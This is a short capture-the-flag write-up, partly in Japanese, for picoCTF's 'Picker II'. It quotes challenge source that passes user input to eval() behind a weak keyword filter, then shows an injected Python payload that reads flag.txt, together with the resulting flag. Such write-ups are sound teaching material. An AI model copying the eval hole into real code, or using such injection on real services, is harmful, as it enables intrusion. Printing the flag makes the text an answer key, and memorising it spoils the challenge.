# Picker II:Reverse Engineering

Can you figure out how this program works to get the flag?\
Connect to the program with netcat: `$ nc saturn.picoctf.net 57878`/
The program's source code can be downloaded [here](https://github.com/colza12/ctf_writeup/blob/main/picoGym%20Exclusive/Picker%20II/picker-II.py).

# Solution

picker-II.pyを見てみる。win関数がある。
```
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```
が、しかし、
```
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```
winが入っているとはじかれるらしい。
```
if( filter(user_input) ):
    eval(user_input + '()')
```
入力を実行してくれるみたいだ。
`open('flag.txt', 'r').read()`を`print`で出力させる。
```
$ nc saturn.picoctf.net 53805
==> print(open('flag.txt', 'r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
'NoneType' object is not callable
```
フラグが得られた。

`picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}`

